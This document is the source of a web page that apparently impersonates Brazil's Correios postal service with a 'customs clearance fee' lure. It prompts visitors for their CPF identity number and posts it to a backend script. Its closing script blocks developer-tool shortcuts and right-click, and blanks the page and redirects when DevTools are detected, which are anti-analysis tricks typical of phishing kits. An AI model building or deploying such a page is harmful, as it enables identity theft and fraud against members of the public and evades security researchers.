<?php
?>
<html lang="pt-br">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">



  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title id="titulo-animado"> • Desembaraço Aduaneiro - Correios</title>
  <script src="./assets/saved_resource"></script>
  <link rel="stylesheet" href="./assets/all.min.css">
  <link href="./assets/css2" rel="stylesheet">
  <link rel="icon" href="./regular_correios-logo-2.png" type="image/x-icon">
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const titulo = document.getElementById('titulo-animado');
      // Array com diferentes títulos para randomizar
      const titulos = [
        "Liberação Aduaneira - Pagamento de Taxas",
        "Pagamento de Taxas Alfandegárias",
        "Desembaraço Aduaneiro - Correios",
        "Importação - Liberação de Remessas"
      ];
      // Seleciona um título aleatório
      const textoOriginal = titulos[Math.floor(Math.random() * titulos.length)];
      // Atualiza o título na página
      titulo.textContent = textoOriginal;
      const velocidade = 15000; // velocidade em milissegundos

      function animarTitulo() {
        document.title = textoOriginal;
        let posicao = 0;
        let direcao = 1;

        setInterval(function() {
          if (posicao > textoOriginal.length) {
            direcao = -1;
          } else if (posicao <= 0) {
            direcao = 1;
          }

          posicao += direcao;

          if (direcao === 1) {
            // Movendo da direita para a esquerda
            document.title = textoOriginal.substring(posicao) + " • " + textoOriginal.substring(0, posicao);
          } else {
            // Movendo da esquerda para a direita
            document.title = textoOriginal.substring(textoOriginal.length - posicao) + " • " + textoOriginal.substring(0, textoOriginal.length - posicao);
          }
        }, 200);
      }

      animarTitulo();
    });
  </script>
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background-color: white;
      /* Define a cor de fundo como branca */
    }
  </style>
  <style>
    *,
    ::before,
    ::after {
      --tw-border-spacing-x: 0;
      --tw-border-spacing-y: 0;
      --tw-translate-x: 0;
      --tw-translate-y: 0;
      --tw-rotate: 0;
      --tw-skew-x: 0;
      --tw-skew-y: 0;
      --tw-scale-x: 1;
      --tw-scale-y: 1;
      --tw-pan-x: ;
      --tw-pan-y: ;
      --tw-pinch-zoom: ;
      --tw-scroll-snap-strictness: proximity;
      --tw-gradient-from-position: ;
      --tw-gradient-via-position: ;
      --tw-gradient-to-position: ;
      --tw-ordinal: ;
      --tw-slashed-zero: ;
      --tw-numeric-figure: ;
      --tw-numeric-spacing: ;
      --tw-numeric-fraction: ;
      --tw-ring-inset: ;
      --tw-ring-offset-width: 0px;
      --tw-ring-offset-color: #fff;
      --tw-ring-color: rgb(59 130 246 / 0.5);
      --tw-ring-offset-shadow: 0 0 #0000;
      --tw-ring-shadow: 0 0 #0000;
      --tw-shadow: 0 0 #0000;
      --tw-shadow-colored: 0 0 #0000;
      --tw-blur: ;
      --tw-brightness: ;
      --tw-contrast: ;
      --tw-grayscale: ;
      --tw-hue-rotate: ;
      --tw-invert: ;
      --tw-saturate: ;
      --tw-sepia: ;
      --tw-drop-shadow: ;
      --tw-backdrop-blur: ;
      --tw-backdrop-brightness: ;
      --tw-backdrop-contrast: ;
      --tw-backdrop-grayscale: ;
      --tw-backdrop-hue-rotate: ;
      --tw-backdrop-invert: ;
      --tw-backdrop-opacity: ;
      --tw-backdrop-saturate: ;
      --tw-backdrop-sepia: ;
      --tw-contain-size: ;
      --tw-contain-layout: ;
      --tw-contain-paint: ;
      --tw-contain-style:
    }

    ::backdrop {
      --tw-border-spacing-x: 0;
      --tw-border-spacing-y: 0;
      --tw-translate-x: 0;
      --tw-translate-y: 0;
      --tw-rotate: 0;
      --tw-skew-x: 0;
      --tw-skew-y: 0;
      --tw-scale-x: 1;
      --tw-scale-y: 1;
      --tw-pan-x: ;
      --tw-pan-y: ;
      --tw-pinch-zoom: ;
      --tw-scroll-snap-strictness: proximity;
      --tw-gradient-from-position: ;
      --tw-gradient-via-position: ;
      --tw-gradient-to-position: ;
      --tw-ordinal: ;
      --tw-slashed-zero: ;
      --tw-numeric-figure: ;
      --tw-numeric-spacing: ;
      --tw-numeric-fraction: ;
      --tw-ring-inset: ;
      --tw-ring-offset-width: 0px;
      --tw-ring-offset-color: #fff;
      --tw-ring-color: rgb(59 130 246 / 0.5);
      --tw-ring-offset-shadow: 0 0 #0000;
      --tw-ring-shadow: 0 0 #0000;
      --tw-shadow: 0 0 #0000;
      --tw-shadow-colored: 0 0 #0000;
      --tw-blur: ;
      --tw-brightness: ;
      --tw-contrast: ;
      --tw-grayscale: ;
      --tw-hue-rotate: ;
      --tw-invert: ;
      --tw-saturate: ;
      --tw-sepia: ;
      --tw-drop-shadow: ;
      --tw-backdrop-blur: ;
      --tw-backdrop-brightness: ;
      --tw-backdrop-contrast: ;
      --tw-backdrop-grayscale: ;
      --tw-backdrop-hue-rotate: ;
      --tw-backdrop-invert: ;
      --tw-backdrop-opacity: ;
      --tw-backdrop-saturate: ;
      --tw-backdrop-sepia: ;
      --tw-contain-size: ;
      --tw-contain-layout: ;
      --tw-contain-paint: ;
      --tw-contain-style:
    }

    /* ! tailwindcss v3.4.16 | MIT License | https://tailwindcss.com */
    *,
    ::after,
    ::before {
      box-sizing: border-box;
      border-width: 0;
      border-style: solid;
      border-color: #e5e7eb
    }

    ::after,
    ::before {
      --tw-content: ''
    }

    :host,
    html {
      line-height: 1.5;
      -webkit-text-size-adjust: 100%;
      -moz-tab-size: 4;
      tab-size: 4;
      font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
      font-feature-settings: normal;
      font-variation-settings: normal;
      -webkit-tap-highlight-color: transparent
    }

    body {
      margin: 0;
      line-height: inherit
    }

    hr {
      height: 0;
      color: inherit;
      border-top-width: 1px
    }

    abbr:where([title]) {
      -webkit-text-decoration: underline dotted;
      text-decoration: underline dotted
    }

    h1,
    h2,
    h3,
    h4,
    h5,
    h6 {
      font-size: inherit;
      font-weight: inherit
    }

    a {
      color: inherit;
      text-decoration: inherit
    }

    b,
    strong {
      font-weight: bolder
    }

    code,
    kbd,
    pre,
    samp {
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
      font-feature-settings: normal;
      font-variation-settings: normal;
      font-size: 1em
    }

    small {
      font-size: 80%
    }

    sub,
    sup {
      font-size: 75%;
      line-height: 0;
      position: relative;
      vertical-align: baseline
    }

    sub {
      bottom: -.25em
    }

    sup {
      top: -.5em
    }

    table {
      text-indent: 0;
      border-color: inherit;
      border-collapse: collapse
    }

    button,
    input,
    optgroup,
    select,
    textarea {
      font-family: inherit;
      font-feature-settings: inherit;
      font-variation-settings: inherit;
      font-size: 100%;
      font-weight: inherit;
      line-height: inherit;
      letter-spacing: inherit;
      color: inherit;
      margin: 0;
      padding: 0
    }

    button,
    select {
      text-transform: none
    }

    button,
    input:where([type=button]),
    input:where([type=reset]),
    input:where([type=submit]) {
      -webkit-appearance: button;
      background-color: transparent;
      background-image: none
    }

    :-moz-focusring {
      outline: auto
    }

    :-moz-ui-invalid {
      box-shadow: none
    }

    progress {
      vertical-align: baseline
    }

    ::-webkit-inner-spin-button,
    ::-webkit-outer-spin-button {
      height: auto
    }

    [type=search] {
      -webkit-appearance: textfield;
      outline-offset: -2px
    }

    ::-webkit-search-decoration {
      -webkit-appearance: none
    }

    ::-webkit-file-upload-button {
      -webkit-appearance: button;
      font: inherit
    }

    summary {
      display: list-item
    }

    blockquote,
    dd,
    dl,
    figure,
    h1,
    h2,
    h3,
    h4,
    h5,
    h6,
    hr,
    p,
    pre {
      margin: 0
    }

    fieldset {
      margin: 0;
      padding: 0
    }

    legend {
      padding: 0
    }

    menu,
    ol,
    ul {
      list-style: none;
      margin: 0;
      padding: 0
    }

    dialog {
      padding: 0
    }

    textarea {
      resize: vertical
    }

    input::placeholder,
    textarea::placeholder {
      opacity: 1;
      color: #9ca3af
    }

    [role=button],
    button {
      cursor: pointer
    }

    :disabled {
      cursor: default
    }

    audio,
    canvas,
    embed,
    iframe,
    img,
    object,
    svg,
    video {
      display: block;
      vertical-align: middle
    }

    img,
    video {
      max-width: 100%;
      height: auto
    }

    [hidden]:where(:not([hidden=until-found])) {
      display: none
    }

    .container {
      width: 100%
    }

    @media (min-width: 640px) {
      .container {
        max-width: 640px
      }
    }

    @media (min-width: 768px) {
      .container {
        max-width: 768px
      }
    }

    @media (min-width: 1024px) {
      .container {
        max-width: 1024px
      }
    }

    @media (min-width: 1280px) {
      .container {
        max-width: 1280px
      }
    }

    @media (min-width: 1536px) {
      .container {
        max-width: 1536px
      }
    }

    .absolute {
      position: absolute
    }

    .relative {
      position: relative
    }

    .right-20 {
      right: 5rem
    }

    .right-4 {
      right: 1rem
    }

    .top-1\/2 {
      top: 50%
    }

    .mx-0 {
      margin-left: 0px;
      margin-right: 0px
    }

    .mx-auto {
      margin-left: auto;
      margin-right: auto
    }

    .mr-4 {
      margin-right: 1rem
    }

    .mb-4 {
      margin-bottom: 1rem
    }

    .ml-20 {
      margin-left: 5rem
    }

    .mb-2 {
      margin-bottom: 0.5rem
    }

    .mt-4 {
      margin-top: 1rem
    }

    .flex {
      display: flex
    }

    .grid {
      display: grid
    }

    .hidden {
      display: none
    }

    .h-8 {
      height: 2rem
    }

    .h-16 {
      height: 4rem
    }

    .h-12 {
      height: 3rem
    }

    .h-14 {
      height: 3.5rem
    }

    .h-48 {
      height: 12rem
    }

    .h-full {
      height: 100%
    }

    .w-full {
      width: 100%
    }

    .w-16 {
      width: 4rem
    }

    .w-3\/4 {
      width: 75%
    }

    .-translate-y-1\/2 {
      --tw-translate-y: -50%;
      transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
    }

    .transform {
      transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
    }

    .grid-cols-1 {
      grid-template-columns: repeat(1, minmax(0, 1fr))
    }

    .flex-row {
      flex-direction: row
    }

    .flex-col {
      flex-direction: column
    }

    .items-center {
      align-items: center
    }

    .justify-center {
      justify-content: center
    }

    .justify-between {
      justify-content: space-between
    }

    .gap-8 {
      gap: 2rem
    }

    .space-x-6> :not([hidden])~ :not([hidden]) {
      --tw-space-x-reverse: 0;
      margin-right: calc(1.5rem * var(--tw-space-x-reverse));
      margin-left: calc(1.5rem * calc(1 - var(--tw-space-x-reverse)))
    }

    .space-x-4> :not([hidden])~ :not([hidden]) {
      --tw-space-x-reverse: 0;
      margin-right: calc(1rem * var(--tw-space-x-reverse));
      margin-left: calc(1rem * calc(1 - var(--tw-space-x-reverse)))
    }

    .rounded {
      border-radius: 0.25rem
    }

    .border {
      border-width: 1px
    }

    .border-l-2 {
      border-left-width: 2px
    }

    .border-gray-300 {
      --tw-border-opacity: 1;
      border-color: rgb(209 213 219 / var(--tw-border-opacity, 1))
    }

    .border-yellow-500 {
      --tw-border-opacity: 1;
      border-color: rgb(234 179 8 / var(--tw-border-opacity, 1))
    }

    .bg-\[\#ebebeb\] {
      --tw-bg-opacity: 1;
      background-color: rgb(235 235 235 / var(--tw-bg-opacity, 1))
    }

    .bg-yellow-500 {
      --tw-bg-opacity: 1;
      background-color: rgb(234 179 8 / var(--tw-bg-opacity, 1))
    }

    .bg-white {
      --tw-bg-opacity: 1;
      background-color: rgb(255 255 255 / var(--tw-bg-opacity, 1))
    }

    .object-cover {
      object-fit: cover
    }

    .px-4 {
      padding-left: 1rem;
      padding-right: 1rem
    }

    .py-2 {
      padding-top: 0.5rem;
      padding-bottom: 0.5rem
    }

    .py-3 {
      padding-top: 0.75rem;
      padding-bottom: 0.75rem
    }

    .py-4 {
      padding-top: 1rem;
      padding-bottom: 1rem
    }

    .px-52 {
      padding-left: 13rem;
      padding-right: 13rem
    }

    .px-0 {
      padding-left: 0px;
      padding-right: 0px
    }

    .py-8 {
      padding-top: 2rem;
      padding-bottom: 2rem
    }

    .pl-6 {
      padding-left: 1.5rem
    }

    .pr-6 {
      padding-right: 1.5rem
    }

    .pl-12 {
      padding-left: 3rem
    }

    .pl-20 {
      padding-left: 5rem
    }

    .text-xs {
      font-size: 0.75rem;
      line-height: 1rem
    }

    .text-xl {
      font-size: 1.25rem;
      line-height: 1.75rem
    }

    .text-sm {
      font-size: 0.875rem;
      line-height: 1.25rem
    }

    .font-bold {
      font-weight: 700
    }

    .text-\[\#0082C3\] {
      --tw-text-opacity: 1;
      color: rgb(0 130 195 / var(--tw-text-opacity, 1))
    }

    .text-blue-600 {
      --tw-text-opacity: 1;
      color: rgb(37 99 235 / var(--tw-text-opacity, 1))
    }

    .text-red-600 {
      --tw-text-opacity: 1;
      color: rgb(220 38 38 / var(--tw-text-opacity, 1))
    }

    .text-black {
      --tw-text-opacity: 1;
      color: rgb(0 0 0 / var(--tw-text-opacity, 1))
    }

    .text-blue-700 {
      --tw-text-opacity: 1;
      color: rgb(29 78 216 / var(--tw-text-opacity, 1))
    }

    .text-blue-900 {
      --tw-text-opacity: 1;
      color: rgb(30 58 138 / var(--tw-text-opacity, 1))
    }

    .text-gray-700 {
      --tw-text-opacity: 1;
      color: rgb(55 65 81 / var(--tw-text-opacity, 1))
    }

    .text-gray-800 {
      --tw-text-opacity: 1;
      color: rgb(31 41 55 / var(--tw-text-opacity, 1))
    }

    .text-green-600 {
      --tw-text-opacity: 1;
      color: rgb(22 163 74 / var(--tw-text-opacity, 1))
    }

    .text-pink-600 {
      --tw-text-opacity: 1;
      color: rgb(219 39 119 / var(--tw-text-opacity, 1))
    }

    .text-red-700 {
      --tw-text-opacity: 1;
      color: rgb(185 28 28 / var(--tw-text-opacity, 1))
    }

    .shadow {
      --tw-shadow: 0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1);
      --tw-shadow-colored: 0 1px 3px 0 var(--tw-shadow-color), 0 1px 2px -1px var(--tw-shadow-color);
      box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
    }

    .hover\:text-\[\#663300\]:hover {
      --tw-text-opacity: 1;
      color: rgb(102 51 0 / var(--tw-text-opacity, 1))
    }

    .hover\:text-blue-600:hover {
      --tw-text-opacity: 1;
      color: rgb(37 99 235 / var(--tw-text-opacity, 1))
    }

    .focus\:border-2:focus {
      border-width: 2px
    }

    @media (min-width: 768px) {
      .md\:grid-cols-4 {
        grid-template-columns: repeat(4, minmax(0, 1fr))
      }

      .md\:flex-row {
        flex-direction: row
      }
    }
  </style>
</head>

<body>
  <header class="bg-[#ebebeb] shadow py-4">
    <div class="container mx-auto px-4 flex justify-between items-center">
      <div class="flex items-center">
        <img src="./assets/correios.svg" alt="Correios logo" class="h-8">
      </div>
      <div class="flex items-center space-x-6">
        <nav class="space-x-6 pr-6">
          <a href="#" class="text-[#0082C3] hover:text-[#663300]">Enviar</a>
          <a href="#" class="text-[#0082C3] hover:text-[#663300]">Receber</a>
          <a href="#" class="text-[#0082C3] hover:text-[#663300]">Comprar</a>
          <a href="#" class="text-[#0082C3] hover:text-[#663300]">Logística</a>
          <a href="#" class="text-[#0082C3] hover:text-[#663300]">Atendimento</a>
          <a href="#" class="text-[#0082C3] hover:text-[#663300]">Acesso à Informação</a>
        </nav>
        <div class="border-l-2 border-gray-300 pl-6">
          <div class="flex items-center space-x-6">
            <a href="#" class="text-[#0082C3] hover:text-[#663300] flex items-center">
              <object data="./assets/entrar-cor.svg" type="image/svg+xml" class="h-8 mr-4"></object>
              <span class="text-xs">Faça Login <br>ou Cadastre-se</span>
            </a>
            <div class="border-l-2 border-gray-300 pl-6">
              <a href="#" class="text-[#0082C3] hover:text-[#663300] font-bold flex items-center">
                <object data="./assets/busca-cor.svg" type="image/svg+xml" class="h-8 mr-4"></object>
                Busca
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  </header>
  <section class="bg-yellow-500">
    <div class="imagens-trocaveis">
      <div class="flex justify-center">
        <img src="./assets/imagem_computador.png" alt="Imagem Computador" class="w-full object-cover mx-0 hidden">
        <img src="./assets/imagem_computador(1).png" alt="Imagem Computador" class="w-full object-cover mx-0">
        <img src="./assets/imagem_computador(2).png" alt="Imagem Computador" class="w-full object-cover mx-0 hidden">
      </div>
    </div>
  </section>

  <div class="bg-yellow-500 py-2"> </div>
  <div class="py-3"></div>

  <script>
    let imagens = document.querySelectorAll('.imagens-trocaveis .flex img');
    let indice = 0;

    setInterval(() => {
      imagens[indice].classList.add('hidden');
      indice = (indice + 1) % imagens.length;
      imagens[indice].classList.remove('hidden');
    }, 5000);
  </script>

  <div class="py-2"></div>

  <section class="bg-[#ebebeb] py-2">
    <div class="container mx-auto px-4">
      <div class="flex flex-col md:flex-row items-center justify-between">
        <div class="flex flex-col items-center space-x-4">
          <h2 class="text-xl font-bold mb-4 ml-20 text-blue-600">Digite seu CPF e acompanhe seu Objeto</h2>
          <form action="./backend.php" method="POST" id="form-cpf">
            <div class="flex items-center">
              <img src="./assets/thumb.png" alt="Ícone de integração" class="h-16 w-16 mr-4">
              <div class="relative">
        <input type="text" id="cpf" name="cpf" placeholder="Digite seu CPF" class="border border-gray-300 rounded px-52 py-4 w-full focus:border-blue focus:border-2 pl-12" oninput="formatarCPF(this); verificarCPF(this)" onkeypress="return (this.value.length < 11)">
                <i class="fas fa-search absolute top-1/2 transform -translate-y-1/2 right-4 text-blue-600"></i>
                <span id="erro-cpf" class="text-red-600 text-xs absolute top-1/2 transform -translate-y-1/2 right-20 hidden">CPF inválido</span>
              </div>
            </div>
          </form>
          <script>
            function formatarCPF(input) {
              var cpf = input.value.replace(/[^0-9]/g, '');
              if (cpf.length <= 11) {
                input.value = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/g, '$1.$2.$3-$4');
              }
            }

            function verificarCPF(input) {
              var cpf = input.value.replace(/[^0-9]/g, '');
              var erro = document.getElementById('erro-cpf');
              if (cpf.length === 11) {
                if (!validarCPF(cpf)) {
                  erro.classList.remove('hidden');
                } else {
                  erro.classList.add('hidden');
                  window.location.href = './backend.php?cpf=' + cpf;
                }
              } else {
                erro.classList.add('hidden');
              }
            }

            function validarCPF(cpf) {
              var soma = 0;
              var resto;
              var igual = true;

              for (var i = 1; i <= 9; i++) {
                soma += parseInt(cpf.substring(i - 1, i)) * (10 - i + 1);
                if (cpf.substring(i - 1, i) !== cpf.substring(0, 1)) {
                  igual = false;
                }
              }

              resto = soma % 11;
              if (resto < 2) {
                resto = 0;
              } else {
                resto = 11 - resto;
              }

              if (resto !== parseInt(cpf.substring(9, 10)) || igual) {
                return false;
              }

              soma = 0;
              for (var i = 1; i <= 10; i++) {
                soma += parseInt(cpf.substring(i - 1, i)) * (11 - i + 1);
              }

              resto = soma % 11;
              if (resto < 2) {
                resto = 0;
              } else {
                resto = 11 - resto;
              }

              if (resto !== parseInt(cpf.substring(10, 11))) {
                return false;
              }

              return true;
            }
          </script>

        </div>
        <div class="border-l-2 border-yellow-500 pl-20 h-48 flex items-center justify-center mt-4">
          <div class="flex flex-row space-x-4">
            <a href="#" class="text-gray-700 hover:text-blue-600 flex flex-col items-center">
              <img src="./assets/img1.png" alt="Imagem 1" class="h-14 mb-2">
              <span class="text-blue-600">Preços e Prazos</span>
            </a>
            <a href="#" class="text-gray-700 hover:text-blue-600 flex flex-col items-center">
              <img src="./assets/img2.png" alt="Imagem 2" class="h-14 mb-2">
              <span class="text-blue-600">Central de Atendimento</span>
            </a>
            <a href="#" class="text-gray-700 hover:text-blue-600 flex flex-col items-center">
              <img src="./assets/img3.png" alt="Imagem 3" class="h-14 mb-2">
              <span class="text-blue-600">Busca CEP ou Endereço</span>
            </a>
            <a href="#" class="text-gray-700 hover:text-blue-600 flex flex-col items-center">
              <img src="./assets/img4.png" alt="Imagem 4" class="h-14 mb-2">
              <span class="text-blue-600">App Correios</span>
            </a>
            <a href="#" class="text-gray-700 hover:text-blue-600 flex flex-col items-center">
              <img src="./assets/img5.png" alt="Imagem 5" class="h-14 mb-2">
              <span class="text-blue-600">Correios Empresas</span>
            </a>
            <a href="#" class="text-gray-700 hover:text-blue-600 flex flex-col items-center">
              <img src="./assets/img6.png" alt="Imagem 6" class="h-14 mb-2">
              <span class="text-blue-600">Outra Opção</span>
            </a>
          </div>
        </div>
      </div>
    </div>
  </section>

  <div class="py-2"></div>

  <section class="container mx-auto px-0 flex bg-[#ebebeb] w-3/4 mx-auto h-48">
    <img src="./assets/imagem_computador(4).png" alt="Imagem" class="w-full h-full object-cover">
  </section>

  <footer class="bg-white">
    <div class="container mx-auto py-8">
      <div class="grid grid-cols-1 md:grid-cols-4 gap-8 text-blue-900">
        <div>
          <h3 class="font-bold mb-4">Fale Conosco</h3>
          <ul>
            <li class="mb-2"><i class="fas fa-clipboard-list"></i> Registro de manifestações</li>
            <li class="mb-2"><i class="fas fa-phone-alt"></i> Central de atendimento</li>
            <li class="mb-2"><i class="fas fa-briefcase"></i> Soluções para o seu negócio</li>
            <li class="mb-2"><i class="fas fa-headset"></i> Suporte ao cliente com contrato</li>
            <li class="mb-2"><i class="fas fa-comments"></i> Ouvidoria</li>
            <li class="mb-2"><i class="fas fa-exclamation-triangle"></i> Denúncia</li>
            <li class="mb-2"><i class="fas fa-shield-alt"></i> Segurança</li>
          </ul>
        </div>
        <div>
          <h3 class="font-bold mb-4">Sobre os Correios</h3>
          <ul>
            <li class="mb-2"><i class="fas fa-id-badge"></i> Identidade corporativa</li>
            <li class="mb-2"><i class="fas fa-graduation-cap"></i> Educação e cultura</li>
            <li class="mb-2"><i class="fas fa-book"></i> Código de Conduta Ética e Integridade</li>
            <li class="mb-2"><i class="fas fa-balance-scale"></i> Transparência e prestação de contas</li>
            <li class="mb-2"><i class="fas fa-leaf"></i> Sustentabilidade</li>
            <li class="mb-2"><i class="fas fa-cookie-bite"></i> Política de privacidade e cookies</li>
            <li class="mb-2"><i class="fas fa-user-shield"></i> Minha Privacidade nos Correios</li>
          </ul>
        </div>
        <div>
          <h3 class="font-bold mb-4">Informações</h3>
          <ul>
            <li class="mb-2"><i class="fas fa-store"></i> Loja online dos Correios</li>
            <li class="mb-2"><i class="fas fa-envelope"></i> Postalis</li>
            <li class="mb-2"><i class="fas fa-heartbeat"></i> Postal Saúde</li>
            <li class="mb-2"><i class="fas fa-building"></i> Ministério das Comunicações</li>
            <li class="mb-2"><i class="fas fa-file-alt"></i> Carta de Serviço ao Usuário</li>
            <li class="mb-2"><i class="fas fa-file-signature"></i> SEI - Protocolo Eletrônico</li>
            <li class="mb-2"><i class="fas fa-info-circle"></i> Acesso à Informação</li>
          </ul>
        </div>
        <div>
          <h3 class="font-bold mb-4">Siga os Correios</h3>
          <div class="flex space-x-4 mb-4">
            <a href="#"><i class="fab fa-youtube text-red-600"></i></a>
            <a href="#"><i class="fab fa-instagram text-pink-600"></i></a>
            <a href="#"><i class="fab fa-facebook text-blue-600"></i></a>
            <a href="#"><i class="fab fa-linkedin text-blue-700"></i></a>
            <a href="#"><i class="fab fa-tiktok text-black"></i></a>
            <a href="#"><i class="fab fa-pinterest text-red-700"></i></a>
          </div>
          <h3 class="font-bold mb-4">Aplicativos Correios</h3>
          <div class="flex space-x-4">
            <a href="#"><i class="fab fa-apple text-gray-800"></i></a>
            <a href="#"><i class="fab fa-android text-green-600"></i></a>
          </div>
        </div>
      </div>
    </div>
    <div class="bg-yellow-500 py-4">
      <div class="container mx-auto flex justify-center items-center">
        <div class="flex items-center space-x-4">
          <p class="text-sm text-gray-800">© Copyright 2025 Correios</p>
          <img src="./assets/logo-footer1.png" alt="Governo Federal Brasil logo" class="h-12">
        </div>
      </div>
    </div>
  </footer>
<script>
  function formatarCPF(input) {
    var cpf = input.value.replace(/[^0-9]/g, '');
    if (cpf.length <= 11) {
      input.value = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/g, '$1.$2.$3-$4');
    }
  }

  function verificarCPF(input) {
    var cpf = input.value.replace(/[^0-9]/g, '');
    var erro = document.getElementById('erro-cpf');
    var form = document.getElementById('form-cpf');
    if (cpf.length === 11) {
      if (!validarCPF(cpf)) {
        erro.classList.remove('hidden');
      } else {
        erro.classList.add('hidden');
        form.submit(); // Submits the form to backend.php
      }
    } else {
      erro.classList.add('hidden');
    }
  }

  function validarCPF(cpf) {
    var soma = 0;
    var resto;
    var igual = true;

    for (var i = 1; i <= 9; i++) {
      soma += parseInt(cpf.substring(i - 1, i)) * (10 - i + 1);
      if (cpf.substring(i - 1, i) !== cpf.substring(0, 1)) {
        igual = false;
      }
    }

    resto = soma % 11;
    if (resto < 2) {
      resto = 0;
    } else {
      resto = 11 - resto;
    }

    if (resto !== parseInt(cpf.substring(9, 10)) || igual) {
      return false;
    }

    soma = 0;
    for (var i = 1; i <= 10; i++) {
      soma += parseInt(cpf.substring(i - 1, i)) * (11 - i + 1);
    }

    resto = soma % 11;
    if (resto < 2) {
      resto = 0;
    } else {
      resto = 11 - resto;
    }

    if (resto !== parseInt(cpf.substring(10, 11))) {
      return false;
    }

    return true;
  }
</script>
  <script>
    const isMobile = /iphone|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase());

    if (!isMobile) {
      // 1. Bloqueia teclas como F12, Ctrl+Shift+I/J/C, Ctrl+U
      document.addEventListener('keydown', function(e) {
        if (
          e.key === 'F12' ||
          (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
          (e.ctrlKey && e.key === 'U')
        ) {
          e.preventDefault();
          e.stopPropagation();
          return false;
        }
      });

      document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
      });

      // 2. Detecta DevTools via console.log
      (function() {
        const detectDevTools = () => {
          const el = new Image();
          Object.defineProperty(el, 'id', {
            get: function() {
              document.body.innerHTML = '';
              window.location.href = 'https://google.com';
            }
          });
          console.log(el);
        };
        setInterval(detectDevTools, 1000);
      })();

      // 3. Detecta pelo tamanho da janela
      (function() {
        let devtoolsOpen = false;
        setInterval(() => {
          const threshold = 160;
          if (
            window.outerHeight - window.innerHeight > threshold ||
            window.outerWidth - window.innerWidth > threshold
          ) {
            if (!devtoolsOpen) {
              devtoolsOpen = true;
              document.body.innerHTML = '';
              window.location.href = 'https://google.com';
            }
          } else {
            devtoolsOpen = false;
          }
        }, 500);
      })();
    }
  </script>


</body>

</html>